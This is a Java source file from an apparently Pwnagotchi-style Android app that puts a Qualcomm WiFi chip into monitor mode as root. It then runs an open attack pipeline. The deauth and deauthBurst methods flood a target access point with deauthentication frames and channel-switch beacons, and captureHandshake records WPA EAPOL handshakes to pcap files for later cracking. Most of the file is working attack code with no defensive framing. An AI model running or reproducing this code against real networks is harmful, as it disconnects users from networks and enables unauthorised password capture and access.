package com.pwnagotchi.app;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Manages native WiFi monitor mode on Qualcomm adrastea (QCACLD-3.0).
 * Enables monitor mode via firmware reload, controls channels via iw.
 * 
 * Attack pipeline: beacon_flood (CSA+deauth) → passive EAPOL capture.
 * NO WiFi toggling — stays in monitor mode the entire time.
 */
public class MonitorManager {
    
    private static final String MODULE = "adrastea";
    private static final String IP = "/system/bin/ip";
    private static final String CON_MODE_PATH = "/sys/module/" + MODULE + "/parameters/con_mode";
    private static final String FW_PATH = "/sys/module/firmware_class/parameters/path";
    private static final String STAGING_DIR = "/data/local/tmp/fw";
    private static final String IFACE = "wlan0";
    private static final String IW_BIN = "/data/local/tmp/iw";
    private static final String IW_LIBS = "/data/local/tmp";
    private static final String BEACON_FLOOD_BIN = "/data/local/tmp/beacon_flood";
    
    private boolean monitorEnabled = false;
    
    /**
     * Send CSA + deauth flood via beacon_flood.
     * Stays in monitor mode — no WiFi toggle needed.
     * Each call sends 10 deauth + 10 CSA beacons (~500ms).
     */
    public void deauth(String apMac, String clientMac, int freqMhz) {
        if (!monitorEnabled) return;
        // beacon_flood <iface> <bssid> <ssid> <apFreq> <ourFreq> <reason>
        // freqs are in MHz (NOT channel numbers!)
        int reason = 7; // Class 3 frame from nonassociated STA
        execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
                     + " \"x\" " + freqMhz + " " + freqMhz + " " + reason + " 2>/dev/null");
    }
    
    /**
     * Deauth burst: rapid beacon_flood calls for durationSeconds.
     * Call interval ~600ms = ~16 calls per 10s = 160 deauth + 160 CSA beacons.
     * @param freqMhz target AP frequency in MHz (e.g. 2437, NOT channel number!)
     */
    public void deauthBurst(String apMac, int freqMhz, int durationSeconds) {
        if (!monitorEnabled) return;
        long end = System.currentTimeMillis() + durationSeconds * 1000L;
        final int[] REASONS = {1, 2, 3, 4, 6, 7};
        int ri = 0;
        while (System.currentTimeMillis() < end) {
            int reason = REASONS[ri % REASONS.length];
            execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
                         + " \"x\" " + freqMhz + " " + freqMhz + " " + reason + " 2>/dev/null");
            ri++;
            try { Thread.sleep(600); } catch (Exception e) {}
        }
    }
    
    /**
     * Stage firmware files from vendor partition.
     */
    private boolean stageFirmware() {
        try {
            String fwSrc = "/vendor/firmware_mnt/image/" + MODULE;
            String fwDst = STAGING_DIR + "/" + MODULE;
            new File(fwDst).mkdirs();
            
            Process p = Runtime.getRuntime().exec(new String[]{
                "su", "-c", "cp " + fwSrc + "/* " + fwDst + "/ 2>/dev/null"
            });
            p.waitFor();
            
            File testDir = new File(fwDst);
            return testDir.exists() && testDir.list() != null && testDir.list().length > 0;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Enable monitor mode via firmware reload.
     * Returns true if con_mode == 4 after the operation.
     */
    public boolean enable() {
        if (monitorEnabled) return true;
        
        // Check if monitor is already active (set up manually or by boot script)
        try {
            String mode = execSu("cat " + CON_MODE_PATH).trim().split("\\n")[0];
            boolean alreadyOn = "4".equals(mode);
            if (alreadyOn) {
                monitorEnabled = true;
                System.out.println("[Monitor] Already active (con_mode=" + mode + ")");
                // Channel set handled externally via starter script
            } else {
                // Try to enable via starter script
                String output = execSu("sh /data/local/tmp/monitor_start.sh");
                monitorEnabled = output.contains("MONITOR_OK");
            }
        } catch (Exception e) {
            monitorEnabled = false;
        }
        return monitorEnabled;
    }
    
    /**
     * Disable monitor mode and restore normal WiFi.
     */
    public boolean disable() {
        if (!monitorEnabled) return true;
        
        try {
            execSu(IP + " link set " + IFACE + " down 2>/dev/null");
            Thread.sleep(500);
            execSu("echo 0 > " + CON_MODE_PATH);
            Thread.sleep(2000);
            // Restore WiFi via Android service
            execSu("svc wifi enable 2>/dev/null");
            
            monitorEnabled = false;
            System.out.println("[Monitor] Disabled");
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Set the monitor channel via iw.
     */
    public void setChannel(int channel) {
        String cmd = "LD_LIBRARY_PATH=" + IW_LIBS + " " + IW_BIN + " dev " + IFACE + " set channel " + channel;
        execSuMagisk(cmd);
        try { Thread.sleep(500); } catch (Exception e) {}
    }
    
    /**
     * Check if monitor mode is currently enabled.
     */
    public boolean isEnabled() {
        return monitorEnabled;
    }
    
    /**
     * Run a tcpdump scan on the monitor interface and return the output.
     * Parses beacon/probe frames for AP discovery.
     */
    public String scan(int durationSeconds) {
        if (!monitorEnabled) return "";
        
        String cmd = "timeout " + durationSeconds + " tcpdump -i " + IFACE 
                     + " -l -n -e 2>/dev/null";
        return execSuMagisk(cmd);  // MUST use magisk context for CAP_NET_RAW
    }
    
    /**
     * Passive EAPOL handshake capture via tcpdump.
     * Captures ALL frames for target BSSID (wlan addr3 filter works on radiotap).
     * Filters EAPOL in post-processing via countEapolFrames().
     * Returns path to pcap if EAPOL frames were captured, null otherwise.
     */
    public String captureHandshake(String outputDir, String bssid, int durationSeconds) {
        if (!monitorEnabled) return null;
        
        String ts = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String path = outputDir + "/hs_" + bssid.replace(":", "") + "_" + ts + ".pcap";
        
        // wlan addr3 filter works correctly on radiotap — captures all 802.11 frames
        // where addr3 (BSSID) matches the target AP. ether proto 0x888e is BROKEN
        // on radiotap because BPF uses wrong offset.
        String cmd = "timeout " + durationSeconds + " tcpdump -i " + IFACE 
                     + " -w " + path + " wlan addr3 " + bssid + " 2>/dev/null";
        execSuMagisk(cmd);
        
        java.io.File f = new java.io.File(path);
        if (f.exists() && f.length() > 68) {
            // Validate: check that we actually got EAPOL frames, not just headers
            int eapolCount = countEapolFrames(path);
            if (eapolCount > 0) {
                System.out.println("[Monitor] Handshake: " + path + " (" + f.length() 
                                   + " bytes, " + eapolCount + " EAPOL frames)");
                return path;
            } else {
                // False positive — beacons or empty capture, discard
                System.out.println("[Monitor] Discarding: " + path + " (no EAPOL, " 
                                   + f.length() + " bytes)");
                f.delete();
                return null;
            }
        }
        // Too small or doesn't exist — cleanup
        if (f.exists() && f.length() <= 68) f.delete();
        return null;
    }
    
    /**
     * Count EAPOL frames in a pcap file.
     * Uses tcpdump to read back and grep for EAPOL indicator.
     */
    private int countEapolFrames(String pcapPath) {
        try {
            String output = execSuMagisk("tcpdump -r " + pcapPath + " -n 2>/dev/null | grep -ci EAPOL");
            output = output.trim();
            if (!output.isEmpty()) {
                return Integer.parseInt(output.split("\\n")[0]);
            }
        } catch (Exception e) {}
        return 0;
    }
    
    /**
     * Execute a command as root via su.
     */
    private String execSu(String cmd) {
        return exec(new String[]{"su", "-c", cmd + " 2>&1; exit"});
    }
    
    /**
     * Execute with magisk context (has CAP_NET_RAW for tcpdump + raw frame injection).
     */
    private String execSuMagisk(String cmd) {
        return exec(new String[]{"su", "-Z", "u:r:magisk:s0", "-c", cmd + " 2>&1; exit"});
    }
    
    private String exec(String[] cmdArray) {
        try {
            Process p = Runtime.getRuntime().exec(cmdArray);
            final StringBuilder sb = new StringBuilder();
            
            // Read in separate thread with timeout
            final InputStream in = p.getInputStream();
            final boolean[] done = {false};
            
            Thread reader = new Thread(() -> {
                try {
                    byte[] buf = new byte[4096];
                    int n;
                    while ((n = in.read(buf)) != -1) {
                        sb.append(new String(buf, 0, n));
                    }
                } catch (Exception e) {}
                done[0] = true;
            }, "exec-reader");
            reader.start();
            
            try { reader.join(65000); } catch (Exception e) {}
            
            if (!done[0]) {
                p.destroy();
                return sb.length() > 0 ? sb.toString() : "";
            }
            
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
